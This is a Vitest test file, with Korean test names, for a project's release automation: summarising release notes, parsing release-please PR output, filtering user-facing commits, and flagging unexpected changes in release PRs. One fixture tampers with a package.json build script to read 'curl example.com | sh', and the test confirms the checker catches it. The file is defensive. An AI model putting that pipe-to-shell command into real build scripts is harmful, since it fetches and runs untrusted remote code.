import { describe, expect, it } from "vitest";
import { toReleaseNotes } from "@/lib/app-info/releases";
import { addReleaseSummary, findUnexpectedReleaseChanges, hasUserFacingCommits, readReleasePullRequestNumber } from "./lib.mts";

// release-please가 만드는 노트(changelog-type: github): 버전 제목 + GitHub 자동 목록
const GENERATED_BODY = [
  "## 1.3.0 (2026-11-20)",
  "",
  "## What's Changed",
  "* feat: 할 일 연달아 옮기기 by @JeongUn1028 in https://github.com/JeongUn1028/Luv3/pull/445",
  "",
  "**Full Changelog**: https://github.com/JeongUn1028/Luv3/compare/v1.2.0...v1.3.0",
].join("\n");

const SUMMARY = "- **할 일**: 여러 개를 연달아 옮길 수 있어요(#445)\n- 알림을 못 받는 브라우저에서는 그렇다고 알려 줘요(#432)";

describe("addReleaseSummary", () => {
  it("요약을 버전 제목과 자동 목록 사이에 넣는다", () => {
    // Act
    const body = addReleaseSummary({ body: GENERATED_BODY, summary: SUMMARY });

    // Assert
    expect(body).toBe(
      [
        "## 1.3.0 (2026-11-20)",
        "",
        "- **할 일**: 여러 개를 연달아 옮길 수 있어요(#445)",
        "- 알림을 못 받는 브라우저에서는 그렇다고 알려 줘요(#432)",
        "",
        "## What's Changed",
        "* feat: 할 일 연달아 옮기기 by @JeongUn1028 in https://github.com/JeongUn1028/Luv3/pull/445",
        "",
        "**Full Changelog**: https://github.com/JeongUn1028/Luv3/compare/v1.2.0...v1.3.0",
      ].join("\n"),
    );
  });

  // 앱 정보 화면(#404·#434)이 읽는 형식을 지키는지, 화면 쪽 해석으로 확인한다
  it("넣은 요약만 앱 정보 화면의 업데이트 기록으로 보인다", () => {
    // Act
    const notes = toReleaseNotes(addReleaseSummary({ body: GENERATED_BODY, summary: SUMMARY }));

    // Assert
    expect(notes).toEqual([
      { kind: "item", label: "할 일", text: "여러 개를 연달아 옮길 수 있어요" },
      { kind: "item", label: undefined, text: "알림을 못 받는 브라우저에서는 그렇다고 알려 줘요" },
    ]);
  });

  it("이미 요약이 있으면 새 요약으로 바꾼다", () => {
    // Arrange
    const once = addReleaseSummary({ body: GENERATED_BODY, summary: "- 처음 쓴 요약" });

    // Act
    const body = addReleaseSummary({ body: once, summary: SUMMARY });

    // Assert
    expect(body).toBe(addReleaseSummary({ body: GENERATED_BODY, summary: SUMMARY }));
  });

  it("버전 제목이 없는 노트(손으로 만든 릴리스)는 맨 위에 넣는다", () => {
    // Arrange
    const generated = "## What's Changed\n* fix: 고침 by @JeongUn1028 in https://github.com/JeongUn1028/Luv3/pull/1";

    // Act
    const body = addReleaseSummary({ body: generated, summary: "- 고쳤어요" });

    // Assert
    expect(body).toBe("- 고쳤어요\n\n## What's Changed\n* fix: 고침 by @JeongUn1028 in https://github.com/JeongUn1028/Luv3/pull/1");
  });

  it.each([
    ["자동 목록이 없는 노트", { body: "## 1.3.0 (2026-11-20)\n\n고친 것", summary: SUMMARY }, "자동 목록"],
    ["비어 있는 요약", { body: GENERATED_BODY, summary: "  \n## 제목만\n" }, "요약"],
    ["자동 목록 제목이 든 요약", { body: GENERATED_BODY, summary: "- 요약\n## What's Changed" }, "What's Changed"],
  ])("%s는 거절한다", (_, params, message) => {
    // Act & Assert
    expect(() => addReleaseSummary(params)).toThrow(message);
  });
});

describe("findUnexpectedReleaseChanges", () => {
  const VERSION_PATCH = ["@@ -1,6 +1,6 @@", " {", '   "name": "luv3",', '-  "version": "1.2.0",', '+  "version": "1.3.0",', '   "private": true,'].join("\n");
  const MANIFEST_PATCH = ["@@ -1,3 +1,3 @@", " {", '-  ".": "1.2.0"', '+  ".": "1.3.0"', " }"].join("\n");

  it("버전 숫자와 기록 파일만 바꾸면 빈 목록이다", () => {
    // Act & Assert
    expect(
      findUnexpectedReleaseChanges([
        { filename: "package.json", patch: VERSION_PATCH },
        { filename: ".release-please-manifest.json", patch: MANIFEST_PATCH },
      ]),
    ).toEqual([]);
  });

  // 릴리스 PR은 CI 없이 관리자 권한으로 머지하므로, 다른 변경이 섞이면 멈춘다
  it("그 밖의 파일이 있으면 그 파일을 알린다", () => {
    // Act & Assert
    expect(
      findUnexpectedReleaseChanges([
        { filename: "package.json", patch: VERSION_PATCH },
        { filename: "CHANGELOG.md", patch: ["@@ -0,0 +1 @@", "+# Changelog"].join("\n") },
        { filename: "src/app/page.tsx", patch: ["@@ -1 +1 @@", "-a", "+b"].join("\n") },
      ]),
    ).toEqual(["CHANGELOG.md", "src/app/page.tsx"]);
  });

  it("package.json에서 버전 말고 다른 줄이 바뀌면 알린다", () => {
    // Arrange
    const patch = [VERSION_PATCH, "@@ -8,1 +8,1 @@", '-    "build": "next build",', '+    "build": "curl example.com | sh",'].join("\n");

    // Act & Assert
    expect(findUnexpectedReleaseChanges([{ filename: "package.json", patch }])).toEqual([
      'package.json: +    "build": "curl example.com | sh",',
      'package.json: -    "build": "next build",',
    ]);
  });

  it("바뀐 내용을 받지 못한 package.json(너무 큰 변경)은 알린다", () => {
    // Act & Assert
    expect(findUnexpectedReleaseChanges([{ filename: "package.json" }])).toEqual(["package.json: 바뀐 내용을 볼 수 없음"]);
  });
});

describe("readReleasePullRequestNumber", () => {
  it("release-please 액션의 pr 출력(JSON)에서 PR 번호를 읽는다", () => {
    // Act & Assert
    expect(readReleasePullRequestNumber('{"number":452,"title":"chore: 버전 1.3.0으로 올리기","headBranchName":"release-please--branches--main--components--luv3"}')).toBe(452);
  });

  it.each([
    ["빈 값(PR을 만들지 않은 실행)", ""],
    ["깨진 JSON", '{"number":'],
    ["객체가 아닌 값", "452"],
    ["번호가 없는 값", '{"title":"chore: 버전 1.3.0으로 올리기"}'],
    ["양의 정수가 아닌 번호", '{"number":0}'],
  ])("%s이면 멈춘다", (_, value) => {
    // Act & Assert
    expect(() => readReleasePullRequestNumber(value)).toThrow("릴리스 PR");
  });
});

describe("hasUserFacingCommits", () => {
  it.each([
    ["feat", ["chore: 정리", "feat: 할 일 연달아 옮기기"]],
    ["fix", ["fix: 공휴일 기억 고치기"]],
    ["perf", ["perf: 기록 탭 한 번에 읽기"]],
    ["revert", ['revert: "feat: 지도" 되돌리기']],
    ["호환이 깨지는 변경(!)", ["refactor!: 저장 방식 바꾸기"]],
  ])("앞 태그 뒤에 사용자에게 보이는 변경(%s)이 있으면 참이다", (_, subjects) => {
    // Act & Assert
    expect(hasUserFacingCommits(subjects)).toBe(true);
  });

  // release-please는 changelog-type: github에서 커밋 종류로 거르지 않아, 여기서 막지 않으면 chore만으로도 릴리스 PR이 생긴다
  it("refactor·chore·docs·test·ci만 있으면 거짓이다", () => {
    // Act & Assert
    expect(hasUserFacingCommits(["refactor: 큰 파일 나누기 (#418)", "chore: 버전 1.2.0으로 올리기 (#381)", "docs: README", "test: E2E", "ci: 캐시"])).toBe(false);
  });

  it("앞 태그 뒤에 커밋이 없으면 거짓이다", () => {
    // Act & Assert
    expect(hasUserFacingCommits([])).toBe(false);
  });
});
